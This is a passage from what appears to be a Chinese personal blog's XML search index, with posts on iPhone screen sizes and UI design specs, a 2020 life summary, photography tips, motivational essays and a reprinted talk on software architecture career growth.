<td align="center">458</td>
</tr>
<tr>
<td align="center">iPhone XR</td>
<td align="center">6.1</td>
<td align="center">414*896</td>
<td align="center"><a href="mailto:&#117;&#x73;&#x65;&#114;&#64;&#50;&#120;&#46;&#x70;&#110;&#x67;">&#117;&#x73;&#x65;&#114;&#64;&#50;&#120;&#46;&#x70;&#110;&#x67;</a></td>
<td align="center">828*1792</td>
<td align="center">326</td>
</tr>
<tr>
<td align="center">iPhone XS Max</td>
<td align="center">6.5</td>
<td align="center">736*1344</td>
<td align="center"><a href="mailto:&#x75;&#x73;&#x65;&#114;&#64;&#x33;&#120;&#46;&#112;&#x6e;&#103;">&#x75;&#x73;&#x65;&#114;&#64;&#x33;&#120;&#46;&#112;&#x6e;&#103;</a></td>
<td align="center">1242*2688</td>
<td align="center">458</td>
</tr>
<tr>
<td align="center">iPhone 11</td>
<td align="center">6.1</td>
<td align="center">414*896</td>
<td align="center"><a href="mailto:&#x75;&#x73;&#x65;&#x72;&#x40;&#50;&#x78;&#x2e;&#x70;&#x6e;&#x67;">&#x75;&#x73;&#x65;&#x72;&#x40;&#50;&#x78;&#x2e;&#x70;&#x6e;&#x67;</a></td>
<td align="center">828*1792</td>
<td align="center">326</td>
</tr>
<tr>
<td align="center">iPhone 11 Pro</td>
<td align="center">5.8</td>
<td align="center">375*812</td>
<td align="center"><a href="mailto:&#x75;&#115;&#x65;&#114;&#64;&#51;&#120;&#46;&#x70;&#x6e;&#103;">&#x75;&#115;&#x65;&#114;&#64;&#51;&#120;&#46;&#x70;&#x6e;&#103;</a></td>
<td align="center">1125*2436</td>
<td align="center">458</td>
</tr>
<tr>
<td align="center">iPhone 11 Pro Max</td>
<td align="center">6.5</td>
<td align="center">414*896</td>
<td align="center"><a href="mailto:&#x75;&#115;&#x65;&#x72;&#x40;&#51;&#x78;&#46;&#112;&#x6e;&#x67;">&#x75;&#115;&#x65;&#x72;&#x40;&#51;&#x78;&#46;&#112;&#x6e;&#x67;</a></td>
<td align="center">1242*2688</td>
<td align="center">458</td>
</tr>
<tr>
<td align="center">iPhone 12</td>
<td align="center">6.1</td>
<td align="center">390*844</td>
<td align="center"><a href="mailto:&#x75;&#115;&#101;&#x72;&#x40;&#51;&#120;&#x2e;&#x70;&#110;&#x67;">&#x75;&#115;&#101;&#x72;&#x40;&#51;&#120;&#x2e;&#x70;&#110;&#x67;</a></td>
<td align="center">1170*2532</td>
<td align="center">460</td>
</tr>
<tr>
<td align="center">iPhone 12 mini</td>
<td align="center">5.4</td>
<td align="center">375*812</td>
<td align="center"><a href="mailto:&#x75;&#x73;&#x65;&#114;&#x40;&#51;&#120;&#x2e;&#x70;&#110;&#x67;">&#x75;&#x73;&#x65;&#114;&#x40;&#51;&#120;&#x2e;&#x70;&#110;&#x67;</a></td>
<td align="center">1080*2340</td>
<td align="center">476</td>
</tr>
<tr>
<td align="center">iPhone 12 Pro</td>
<td align="center">6.1</td>
<td align="center">414*896</td>
<td align="center"><a href="mailto:&#117;&#x73;&#x65;&#x72;&#x40;&#x33;&#120;&#46;&#x70;&#x6e;&#x67;">&#117;&#x73;&#x65;&#x72;&#x40;&#x33;&#120;&#46;&#x70;&#x6e;&#x67;</a></td>
<td align="center">1170*2532</td>
<td align="center">460</td>
</tr>
<tr>
<td align="center">iPhone 12 Pro Max</td>
<td align="center">6.7</td>
<td align="center">428*926</td>
<td align="center"><a href="mailto:&#x75;&#115;&#x65;&#114;&#64;&#51;&#120;&#46;&#112;&#x6e;&#103;">&#x75;&#115;&#x65;&#114;&#64;&#51;&#120;&#46;&#112;&#x6e;&#103;</a></td>
<td align="center">1284*2778</td>
<td align="center">458</td>
</tr>
</tbody></table>
<p>iPad 界面尺寸：1024×768、2048×1536</p>
<p>（以上单位都是像素，至于分辨率一般网页UI和移动UI基本上都只要 72 ppi）</p>
<p><strong>2、单位换算px、pt</strong></p>
<p>这里需要先区分pt、px，pt(磅值)是物理长度单位，指的是72分之一英寸。手机上看来同一大小的字磅值是一样的，但是换算成不同分辨率手机的字号px值不一样。（px=pt*ppi/72）</p>
<p>iPhone在出retina屏(也就是4S)之前的屏幕像素是320x480px，屏幕密度是163ppi，4S的屏幕像素是640x960px，屏幕密度是326ppi，翻了一倍。iPhone5的ppi没有变化，兼容性方面要增加类似首屏画面等程序上的判断。</p>
<p>在iPhone界面上元素的定位、尺寸是通过一个单位point，而非px，屏幕上固定有320x480pt，retina屏两倍的分辨率改变的只是pt和px之间的比例而已，这样就能实现不改变程序，只上传两套图片就兼容两个分辨率。</p>
<p><strong><strong>在设计的时候并不是每个尺寸都要做一套，尺寸按自己的手机尺寸来设计，比较方便预览效果，一般用 640×960 或者 640×1136 的尺寸设计。其中设计稿的画布分辨率设为默认的72ppi（此时1px=1pt ），所以设计师可以统一采用px为单位。<br>开发拿到设计稿时，将上面标注的以px为单位的字号大小、图像尺寸除以2，就是非retina屏上的pt值，这样在retina屏上也可以根据此pt值换算对应的px大小，以确保不同的分辨率下有合适的效果。</strong></strong></p>
<p><strong>3、基本元素的尺寸设置</strong></p>
<p>iPhone的APP界面一般由四个元素组成，分别是：状态栏、导航栏、主菜单栏以及中间的内容区域。</p>
<p>这里取用 640×960 的尺寸设计，那我们就说说在这个尺寸下这些元素的尺寸：</p>
<p>状态栏：就是我们经常说的信号、运营商、电量等显示手机状态的区域，其高度为：40 px</p>
<p>导航栏：显示当前界面的名称，包含相应的功能或者页面间跳转的按钮，其高度为：88 px</p>
<p>主菜单栏：类似于页面的主菜单，提供整个应用的分类内容的快速跳转，其高度为：98 px</p>
<p>内容区域：展示应用提供的相应内容，整个应用中布局变更最为频繁的，其高度为：734 px=960-40-88-98</p>
<p>以上尺寸适用于 iPhone 4、4S，iPhone5/5s 的 640×11136 的尺寸，其实就是中间的内容区域高度增加到：910 px，其他尺寸也同上。</p>
<p><strong>4、常用图像、图标大小（来自官方规范文档）</strong></p>
<p>单位：像素</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1b7ce723077960fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="移动应用界面设计的尺寸设置及规范_"></p>
<p><strong>5、字体大小</strong></p>
<p>iOS交互设计规范文档上，对字体大小没有做严格的数值规定，只提供了一些指导原则：</p>
<p>单位：点pt</p>
<p>– 即便用户选择了最小文字大小，文字也不应小于 22 点。作为对照，正文样式在大字号下使用 34 点字体大小作为默认文字大小设置。</p>
<p>– 通常来说，每一档文字大小设置的字体大小和行间距的差异是 2 点。例外情况是两个标题样式，在最小、小和中等设置时都使用相同字体大小、行间距和字间距。</p>
<p>– 在最小的三种文字大小中，字间距相对宽阔；在最大的三种文字大小中，字间距相对紧密。</p>
<p>– 标题和正文样式使用一样的字体大小。为了将其和正文样式区分，标题样式使用加粗效果。</p>
<p>– 导航控制器中的文字使用和大号的正文样式文字大小（明确来说，是 34 点）。</p>
<p>– 文本通常使用常规体和中等大小，而不是用细体和粗体。</p>
<p>百度用户体验做过的一个小调查：</p>
<p>单位：像素px<br><img src="https://upload-images.jianshu.io/upload_images/10024246-53edeaa9f75645e5.gif?imageMogr2/auto-orient/strip" alt="图片描述" title="移动应用界面设计的尺寸设置及规范_"></p>
<p>还有个方法就是找你觉得好的APP应用，手机截图后放进PS自己对比调节字体大小。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>2020三件事</title>
    <url>/nirvana/informal/%E9%9A%8F%E7%AC%94/2020%E5%B9%B4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>##2020三件事：</p>
<ul>
<li>户口迁移：<br>自从毕业后，来到这边10多年，终于把户口迁移过来，同时小朋友的户口也转过来，小朋友上学不再像被歧视一样被统筹，每年都要提交积分信息，转学也先被歧视。</li>
<li>解决住房：<br>上班10多年，一直租房住，大件东西不敢买，每天担心被房东赶，办积分还要求房东，想更新个家具都先想想这个能不能带走。19年终于把房子买下来，花了3个月前后折腾，有过争吵和取舍。庆幸在年前疫情没爆发的时候住了进去。房子虽然小，但是是自己的，也敢瞎折腾了。</li>
<li>个人晋升：<br>今年工作上有了一定的提升，团队变大了，事情更多了，每天想安静的写个代码都很难，更多的是和外部产品、业务去扯皮，团队内要平衡大家的需求和期望。更痛苦的是要绩效排名，总要排个A、B、C、D的先后，更痛苦的是和人员沟通，用领导的话说“绩效好，怎么沟通气氛都是融洽的；绩效不好，如何沟通都是尴尬的”。期望21年在这块有新的提升。</li>
</ul>
<p>遗憾：<br> 生活中对小朋友和家人的关心不够。和小朋友的沟通不够耐心，后面要改进。</p>
]]></content>
      <categories>
        <category>informal</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/nirvana/uncategorized/%E9%9A%8F%E7%AC%94/%E4%BD%A0%E6%83%B3%E8%A6%81%E7%9A%84%E5%92%8C%E5%AD%A9%E5%AD%90%E6%83%B3%E8%A6%81%E7%9A%84/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>内功与成功？</title>
    <url>/nirvana/informal/%E9%9A%8F%E7%AC%94/%E5%86%85%E5%8A%9F%E4%B8%8E%E6%88%90%E5%8A%9F/</url>
    <content><![CDATA[<p> <br>你能够专注，舍得死磕，必然就会克服很多困难和挑战。长此以往，随着时间的推移，优势也悄然形成。在这个追求速成的时代，人人都渴望快速成功，幻想年薪百万。可是，大多数人都忘了，万丈高楼平地起，要想走上金字塔的顶端，首先要砌好地基、打好基础，房子才能越起越高。通往成功最有效的路径，永远是紧盯自己的目标，苦练内功。前期找准方向、扎进土壤、认真生长，后期才能破土而出、扶摇直上。</p>
]]></content>
      <categories>
        <category>informal</category>
      </categories>
  </entry>
  <entry>
    <title>单反摄影入门简明口诀</title>
    <url>/nirvana/informal/%E9%9A%8F%E7%AC%94/%E5%8D%95%E5%8F%8D%E6%91%84%E5%BD%B1%E5%85%A5%E9%97%A8%E7%AE%80%E6%98%8E%E5%8F%A3%E8%AF%80/</url>
    <content><![CDATA[<p> <br>单反摄影入门简明口诀（葵花宝典）<br>    1、拍人像<br>    拍人长焦大圈先，（AV光圈优先自动曝光模式，长焦大光圈浅景深，宜于突出主题虚化背景，通常F5.6及以上）<br>    测光对焦眼脸线，（用中央重点测光或点测光，拍摄头部焦点对眼，半身对脸，全身对身体曲线）<br>    多换角度背景远，（摄影者与被摄者多换角度，被摄者距离背景尽量远，以便虚化背景）<br>    活用补光快门线。（活用闪光灯等补光设备，防止抖动可用三脚架和快门线。）<br>    2、拍风光<br>    拍摄风光光圈先，（AV光圈优先自动曝光模式）<br>    光圈宜小景深远，<br>    调白平衡单驱动，（根据光线情况调整白平衡，采用单次驱动模式）<br>    无限远处对焦点。<br>    3、拍花卉<br>    拍摄花卉微距镜，（最好用微距镜头）<br>    大圈近摄远背景，（大光圈；近距离拍摄，摄距越近，景深越小；花后的背景尽量远）<br>    逆光长焦强对比，（焦距越长，景深越小；花的颜色和背景色彩对比越强越好）<br>    花大构图蕊居中。<br>    4、拍动物<br>    动物总是动不停，<br>    模式宜用P自动，（程序自动曝光，以拍摄时机为优先）<br>    智能伺服焦对眼，（对总是动个不停的动物应该采用人工智能伺服自动对焦模式，对焦时对准动物的眼）<br>    使用连拍虚背景。<br>    5、拍夜景<br>    拍摄夜景别太晚，（天有余光，不要太黑）<br>    夜衡低感快门慢，（夜间白平衡，较低的感光度ISO100，快门1/11）<br>    8-9光圈负补偿，（白增黑减：-0.5-1补偿）<br>    脚架门线防抖颤。（使用三脚架、快门线）<br>    6、拍剪影<br>    要拍剪影用逆光，<br>    对着亮处点测光，<br>    通常四百感光度，<br>    曝光补偿减二档。<br>    7、拍运动物体<br>    运动物体宜连拍，<br>    快门优先抓动态，（TV快门优先，根据动体速度、动向、焦距定快门：动体快快门也要快）<br>    感光稍高追动体，（通常ISO400。要拍动感，用追随法，快门应低于1/60秒）<br>    自动对焦快门快。<br>    8、拍雨丝<br>    拍雨风斜出动感，（大风斜雨效果好）<br>    大圈慢速背景暗，（大光圈，快门速度1/30左右，采用暗背景）<br>    焦雨正比夜光好，（焦距大，雨丝长；焦距小，雨丝短。利用夜光拍摄效果好）<br>    逆光远摄借叶檐。（用逆光，摄距适当远一点，借用叶子、雨伞、房檐滴水和地面积水反光）<br>    9拍雪飘<br>    要拍雪飘速要慢，（快门1/30左右）<br>    焦距定在中短段，<br>    光圈设置8-11，<br>    深色背景显动感。<br>    10、拍雪景<br>    拍雪关键测曝光，<br>    亮白补偿二三档，（白增黑减：+2-3补偿）<br>    巧设前景忌顺光，（设前景增加色彩对比，最好用逆光和侧逆光）<br>    拍人点测对脸上。（如雪景里拍人，对人脸点测光）<br>    11、拍霞光<br>    拍霞圈8测云空，（对着较亮的天空和云彩测光）<br>    负一补偿设前景，（白增黑减：-1补偿）<br>    朝霞早来晚霞晚，（拍朝霞要在太阳升出地平线之前，晚霞在没太阳之后，不宜太早和太晚）<br>    遇到水光拍倒影。<br>    12、画面布置<br>    见山寻侧光，<br>    见水拍倒影，<br>    有云天要多，<br>    无云地七成。<br>    黄金分割线，<br>    主体交点行。<br>2019一起浪 旅行日记</p>
]]></content>
      <categories>
        <category>informal</category>
      </categories>
  </entry>
  <entry>
    <title>孩子，你为什么要努力？</title>
    <url>/nirvana/informal/%E9%9A%8F%E7%AC%94/%E5%AD%A9%E5%AD%90%EF%BC%8C%E4%BD%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8A%AA%E5%8A%9B%EF%BC%9F/</url>
    <content><![CDATA[<p> <br>1.努力，是为了对得起珍贵的自己<br>2.努力，让你发现“原来我可以”<br>3.努力，让你拥有选择的自由和权利<br>4.努力，可以优化你的成长环境<br>5.努力，让身心有一个栖居之地<br>6.努力，和优秀互为因果<br>7.什么才是真的努力？<br>努力不是一时的事，而是一生的事。<br>努力不是过度透支，而是尽力而为。<br>努力不是一项苦役，而是带有回甘。<br>努力不是表面用力，而是在看不见的地方持续深度用力。<br>努力，并不必然意味着将来一片坦途，但可以让我们自己问心无愧！且让我们一起努力每一天，让每一天都成为自己个人传记里清晰的一页，并在这份传记的最后掩卷感叹“生而为人，真好”，而不是“生而为人，我很抱歉”！</p>
]]></content>
      <categories>
        <category>informal</category>
      </categories>
  </entry>
  <entry>
    <title>校长-技术成长四个阶段需要的架构知识</title>
    <url>/nirvana/informal/%E9%9A%8F%E7%AC%94/%E6%A0%A1%E9%95%BF-%E6%8A%80%E6%9C%AF%E6%88%90%E9%95%BF%E5%9B%9B%E4%B8%AA%E9%98%B6%E6%AE%B5%E9%9C%80%E8%A6%81%E7%9A%84%E6%9E%B6%E6%9E%84%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p> <br>转载：<a href="https://weibo.com/ttarticle/p/show?id=2309403963470512042120">https://weibo.com/ttarticle/p/show?id=2309403963470512042120</a><br>编者按：本文是李庆丰在高可用架构后花园群 3.19 北京光华路安妮意大利餐厅下午茶活动的演讲。转载请注明来自@高可用架构。</p>
<blockquote>
<p>李庆丰（校长），微博研发中心高级技术经理，当前负责微博消息箱及开放平台的技术研发工作，曾主导微博平台服务稳定性保障及 SLA 体系建设，推进微博平台化、微博多机房部署、微博容器化及混合云等项目。十年互联网架构研发及技术管理经验，专注高性能高可用架构。 <br>（小编注：庆丰由于主导了微博平台 2011 - 2015 年毕业生新兵训练营工作，随着这些新人的成长以及在关键岗位发挥作用，庆丰已经是桃李满天下，所以也被尊称为校长）</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ebea276f4117cbc2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>(图： 3.19 高可用架构后花园聚会现场)</p>
<p>今天的下午茶活动，与很多技术圈的老朋友详谈甚欢，听到了几位老朋友的分享颇为受益，我也给小伙伴分享我的一点心得。</p>
<p><strong>技术成长需要什么架构知识？</strong></p>
<p>初入工程师这行时我有一个梦想，希望具备强大技术架构能力，让服务于亿级用户的产品稳定运行于其上，今天我看到身边很多架构师都走到这一步。</p>
<p>但对于当年刚入行的我来讲，要达到这一点还只是个梦想，因为那时我并不知道应该怎样构建这样的架构，甚至连需要学习哪些知识都不知道。</p>
<p>我相信很多工程师在成长的路程上也跟我一样，会被一个大大的问号困扰很久：如果要成为一个大牛，应该<strong>需要什么样的技术路线****？</strong></p>
<p>今天跟大家分享下通过观察身边的案例，我总结的一些在技术成长方面的心得体会。</p>
<p><strong>架构师是怎样炼成的？</strong>让我们从圣斗士说起。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-586efacfc3841b3b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p><strong>技术人成长之路四阶段</strong></p>
<p>小时候有一部我特别喜爱的动画片——圣斗士星矢，现在来看，这俨然就是一个技术大牛的成长之路。（小编：校长果然是老司机了：）</p>
<p><strong>1. 从接受训练成为圣斗士，</strong>就像刚刚入门的初级工程师</p>
<p>大多数的应届毕业生，虽然之前学习了编程语言及算法基础，能用代码解决一些简单的业务问题，但编码规范与真正的业务开发实践的要求还是有些距离。</p>
<p>个别彪悍的同学，毕业时能力已经达到中高级工程师的水平了，就可以略过这个阶段。</p>
<p>这一阶段最重要的是<strong>夯实编程基础，养成好的开发习惯</strong>。比如：基础库API的使用、并发线程机制、基础算法、优雅的单元测试等。</p>
<p><strong>这个阶段与其挑选薪资，不如挑选合适的锻炼环境</strong>，比如寻找有良好的技术氛围、有合适的导师，有挑战的项目的团队。</p>
<p><strong>2. 到获得青铜圣衣打败暗黑圣斗士，</strong>就像中/高级工程师</p>
<p>工作 1 - 3 年的工程师，在实战中积累了一些开发经验，了解常用技术框架原理并可以在实际工作中快速搭建服务；了解常用的设计模式，让程序的扩展性变得更好，也可以开始胜任解决相对复杂的一些问题，负责中等规模的服务开发和维护；</p>
<p><strong>这一阶段最重要的是寻找可能的机会进行架构实践</strong>，学习别人的架构经验，最终总结吸收为自己的经验或理论。多研究下典型场景的架构设计很重要，比如：典型社交场景的微博架构，典型电商场景的京东淘宝架构等。</p>
<p>如果公司有合适的历练项目，则多向项目中的前辈学习。但<strong>更多的人遭遇的可能是不那么理想的环境</strong>，参与的项目不需要太高技术含量，身边也没有资深的前辈学习。</p>
<p>这种情况下，<strong>在满足项目交付时间的前提下</strong>，可以更主动去积极寻找项目中可以值得优化的点，通过网上阅读的案例，引入更合适的技术来解决，给自己创造使用一流技术的实践机会。</p>
<p><strong>3. 到击败白银圣斗士，</strong>就像架构师</p>
<p>此阶段，部分 3 - 5 年或经验更久的工程师，随着在工作中不断遇到复杂问题和技术挑战，工程师对原有的技术框架和设计模式有了更深的理解，再根据实际场景的应变，开始能够独立设计和维护大型服务功能。他们具备针对特定场景完成合适的架构设计的能力，在团队中承担高级工程师或架构师角色；</p>
<p>上文之所以说部分工程师，是因为并不是所有人都能跨过中高级工程师这个槛，成为一名合格架构师。</p>
<p>这一阶段是架构知识由泛到专的过程。在特定业务场景下，能够对架构有清晰的目标，并利用已有架构技巧实现目标与成本的平衡，最终满足业务要求。比如作为一个合格的互联网架构师，需要理解常用缓存、存储资源的特性及优缺点，具备架构选型和实现的能力。</p>
<p>另外，我觉得在大多数人看来，中、高级工程师差异还是很大的；而高级工程师和架构师反而过渡不是那么明显。</p>
<p><strong>4. 再到战胜十二黄金圣斗士救出自由女神雅典娜</strong></p>
<p>工程师到这个阶段，已经不能用时间年限来衡量了，<strong>更多的是需要对这个行业的热爱和合适的成长平台</strong>。</p>
<p>随着具体场景下架构设计实践经验的增多，一小部分架构师能够把这些经验抽象为一种通用的理论，形成架构设计的理念，并能够用这种理念指导影响团队中的其他人，加上对于技术如何应用到行业的深刻理解，成为一个公司的首席架构师；</p>
<p><strong>成长为首席架构师，除了个人的努力和不断学习总结积累外，一个好的实践锻炼平台至关重要。</strong></p>
<p>就像高可用架构方向，如果没有亲身经历过高并发、海量数据的服务架构设计和开发的过程，很难凭空想象可能的场景问题和技术挑战，实践经验的总结抽象也就无从谈起；</p>
<p>在这个成长的过程中，圣斗士们通过不断的磨难激发出了第六感、小宇宙，从而使他们变得越来越强大；而工程师也是在解决服务性能瓶颈、服务器宕机、异常峰值应对、分布式数据一致性、海量数据存储等问题中，不断的总结出经验和教训，从而变得越来越有经验。最终，极个别的一些首席架构师脱颖而出，成为了大师。</p>
<p>吴军博士在《硅谷之谜》中也提到，这类工程师通过对行业及技术的理解，<strong>具备做出行业最好产品的能力</strong>，并进一步可以做出给世界带来惊喜的产品，比如 iPhone 及 Google Glass 的总设计师。</p>
<p>高可用架构群就有很多首席架构师级别的前辈，他们在技术架构、技术管理等方面传到解惑，成为技术人员成长的引路人。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-acc7f195ab0187e1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>在技术人员成长的各个阶段，需要具备的知识和技能不同，从最初的语法规范的学习，到后来设计模式的灵活运用，再到对架构的理解和抽象，对技术人的素质要求越来越高。特别是架构知识，这是技术人成长中非常具有挑战的那部分，涉及了方方面面的问题，看似杂乱无章，实际还是有迹可循的。</p>
<p><strong>架构知识拓扑</strong></p>
<p><strong>所谓架构，在互联网的场景，就是保障服务高性能、高可用、可扩展的一系列技术措施。架构的维护成本是评价其好坏的重要因素。</strong></p>
<p><strong>1. 互联网架构的要求</strong></p>
<p>具体来看就是通过一系列的技术手段达到以下要求：</p>
<ul>
<li><p>  性能要足够快以能够满足业务需求；</p>
</li>
<li><p>  业务流量峰值能够扛得住；</p>
</li>
<li><p>  突发异常流量能够应对的来；</p>
</li>
<li><p>  部分服务器宕机不影响整理服务；</p>
</li>
<li><p>  能够随着业务的增长保持有节奏的容量扩容；</p>
</li>
<li><p>  再高级点就是，资源成本要足够低，研发效率要足够高，支持异地容灾，资源弹性伸缩提高资源利用率等。</p>
</li>
</ul>
<p>然而，所有这些针对架构的要求和保证，都需要建立在一定标准之上，如果没有标准，服务的好坏，性能的高低就没法界定，所以，为服务制定 <strong>SLA（Service-Level Agreement）</strong>就变得非常重要。</p>
<p><strong>2. SLA 设置</strong></p>
<p>SLA 从<strong>性能、容量、程度</strong>三个方面对服务好坏做了约定，比如一个服务的 SLA 可以简单的描述为：</p>
<p><strong>99.9% 请求响应时间 &lt; 100ms；最大 QPS 2W；</strong></p>
<p>这里就规定了最大容量 2W QPS，性能上99.9% 的请求小于 100ms 响应，其中 99.9% 就是程度，这 3 个指标会让我们很好的了解服务的状况。</p>
<p>SLA 体系是架构的基础，即作为对外部的保证，也是对内部的约束。</p>
<p><strong>3. 监控的要求</strong></p>
<p>另一方面，好的架构应该时刻了解服务所处的状态，以保证能适时作出合适的应对策略，这让<strong>监控体系</strong>变得非常重要。就像打红警游戏，有个间谍卫星和电力仪表盘是多么重要！</p>
<p>所以，你需要知道如何能让你的监控系统实时准确的反馈相关数据信息，<strong>实时、方便、直观</strong>是衡量一个监控系统好坏的重要指标。</p>
<p><strong>总结：拓扑结构</strong></p>
<p>有了以上两个重要基础，架构设计变得不再那么困难，通过 SLA，你已经知道目标是什么、通过监控体系，你已经知道问题在哪里，剩下的就是通过一系列措施去解决它们。比如，选择合适的存储资源，适当的容错和降级策略，为了架构解耦而做的服务治理和隔离，高可用的异地容灾，为了极致性能而做的网络拓扑调整，以及为了运维效率和资源利用率做的弹性伸缩。这些知识相互关联，互为制约，是设计一个好的架构的重要知识基础。</p>
<p>下图是我在负责微博多个项目的 SLA 时候提出的架构要点。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b3e715dd68d5dfe5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>架构知识都掌握了也不一定就能设计出好的架构，还需要针对具体业务场景灵活的变通。一般分为 2 个层次：术与道。</p>
<p><strong>架构上的术与道</strong></p>
<p>在前面提到，架构师与首席架构师都具备架构设计的能力和经验，但他们却有着术与道的区别。架构上的术，就是针对特定场景的解决方案；架构上的道，是一种思想和理论，能够指导很多通用问题的解决，它更有整理性、全局观。</p>
<p>由术向道的转变，是一个大量亲身架构实践和总结的过程。一方面这取决于你是否有一个好的发挥平台，如果没有这种锻炼平台，大量的亲身架构实践将无从谈起，这种转变几乎不可能实现；另一方面，经验的总结和抽象也不是闭门造车，和业界的高手共同交流探讨是避免走进误区及快速拓展思路的好方法，所以经常的技术分享，适当的技术社群互动就显得非常必要。</p>
<p>通过不断的学习和努力，很多人可以成为架构师，但只有很少的人能成为首席，一个很重要的原因是，除了出色的学习、抽象、总结能力外，大量复杂问题的架构实践至关重要；而这一点一般只有在较大的平台才能遇到。</p>
<p>架构知识说了不少，我们如何高效的获得这些知识呢？</p>
<p><strong>技术阅读</strong></p>
<p>对于工程师来讲，我一直认为我们生活在最好的时代。互联网的蓬勃发展给了我们很多的历练和成长机会，技术社区的繁荣让我们自我学习和提高成为可能。在这个年代，<strong>技术人员的成长在一定程度取决于知识获取及消化能力。</strong></p>
<p>技术博客，技术丛书，技术文章，技术公众号，让技术知识和思想在工程师群体中自由传播，形成技术成长的肥沃土壤，比如从类似「ArchNotes」高可用架构这样的公众号就可以学到大量一线架构师分享的知识与经验。</p>
<p>然而，伴随着技术社区的繁荣，技术知识变得越来越丰富，甚至太丰富了，以至于我们几乎无法全部消化这些信息，我们需要有选择、有甄别的来看；有些需要泛读，有些则需要精读甚至去实践。 </p>
<p>初级工程师在夯实基础阶段需要系统的学习基础知识，这个阶段看书会让你的知识吸收更系统，博客和技术文章作为辅助知识扩展就好了。其他阶段则需要逐渐养成良好的知识获取习惯，比如：每个月看一本专业方向的书，每天定时浏览固定方向的博客或公众号文章，确保系统知识和架构经验都能够不断的获取和吸收。</p>
<p>一般来讲，技术博客或者公众号，是扩展技术视野，吸收他人实践经验的好的方式和渠道；技术丛书则是系统学习某一方面知识的最有效途径。</p>
<p>这么丰富的知识内容，这么多样的展现方式，是技术人共同分享贡献的成果；每个身临其中的技术人既是贡献者，也是受益者，他们学习别人的经验，分享自己的思想，在相互影响中共同进步。</p>
<p><strong>学习与分享</strong></p>
<p>关于学习与分享，让我想起了 Tim 在高可用架构群第一次分享时候引用的那段话：</p>
<blockquote>
<p>你有一个苹果，我有一个苹果，交换后每人还是一个苹果；你有一种思想，我有一种思想，交换后每个人会有两种思想</p>
</blockquote>
<p>这句话完美诠释了分享与交流的价值。</p>
<p>要成长就必须去不断倾听别人的分享，学习别人的经验。分享知识的人多了，大家的学习成本就会降低，成长速度就会变快，大家就会相互促进更快的成长。</p>
<p>根据我自己的体会，<strong>对外分享还是一个自我总结、积累以及进一步提高的过程</strong>。为了避免分享给大家错误的知识，我一般会对分享内容进行多次 review，把之前模糊的、不十分确定的问题搞清楚（分享后被人问住或质疑总是分享者不想碰到的），这个过程往往让我对问题的本质有新的认识。</p>
<p>好的分享还会带来很多讨论和咨询，<strong>促进对问题的更全面认识和思考</strong>。比如 2015 年我在 ArchSummit 大会分享了《新浪微博高可用服务保障体系演进》，现场和会后有很多小伙伴专门来找我一起探讨相关问题，其中有不少场景是我没有遇到的，也给了我很多新的启发。</p>
<p>所以，学习与分享是一个互相促进的过程，学习别人的经验，把自己的实践总结分享出来，技术慢慢的积累，再分享，不断成长，不断学习。。。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-07ad0f510206994e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>所以，我今年除了写些技术文章，我还计划给自己一个新的挑战，写一本关于架构的书：《大型网站高可用服务架构实践》。</p>
<p>写到这的时候，其实我犹豫了很久，想做为啥非要说出来？我之前写过一些技术文章，感觉还不错，所以，就有过写一本书的想法，但真准备去做的时候，发现写书和写一篇技术文章差别非常大。技术文章一般阐述解决一个问题，但书是让人系统学习某一领域的方式，需要有条理的阐述解决一系列问题，并且还需要让大家有兴趣坚持读下去，想想都很有挑战。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b53f7b14f39ac0af.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>今天前面同学分享时提到，如果实在感觉困难就倒逼一下自己，所以为了让自己能坚持下来，我就尝试下这种方式，让“太忙了、没时间”等借口少一些机会，说不定还能吸引一些感兴趣的小伙伴一起参与。</p>
<p>2016 年，大家一起加油！</p>
<p><em>转载请注明来自@高可用架构</em></p>
]]></content>
      <categories>
        <category>informal</category>
      </categories>
  </entry>
  <entry>
    <title>百般乐器，唢呐为王</title>
    <url>/nirvana/informal/%E9%9A%8F%E7%AC%94/%E7%99%BE%E8%88%AC%E4%B9%90%E5%99%A8%EF%BC%8C%E5%94%A2%E5%91%90%E4%B8%BA%E7%8E%8B/</url>
    <content><![CDATA[<p>百般乐器，唢呐为王，<br>不是升天，就是拜堂，<br>千年琵琶，万年筝，<br>一把二胡拉一生。<br>唢呐一响全剧终，<br>曲一响，布一盖，<br>全村老小等上菜，<br>走的走，抬的抬，<br>后面跟着一片白。<br>棺一抬，土一埋，<br>亲朋好友哭起来，<br>鞭炮响，唢呐吹，<br>前面抬，后面追，<br>初闻不知唢呐意，再闻以是棺中人。<br>两耳不闻棺外事，一心只蹦黄泉迪，<br>一路嗨到阎王殿，从此不恋人世间</p>
]]></content>
      <categories>
        <category>informal</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/nirvana/uncategorized/%E9%9A%8F%E7%AC%94/%E9%80%89%E6%8B%A9%E6%9D%83%E6%98%AF%E6%9C%80%E5%A4%A7%E7%9A%84%E8%87%AA%E7%94%B1/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>伪随机和真随机</title>
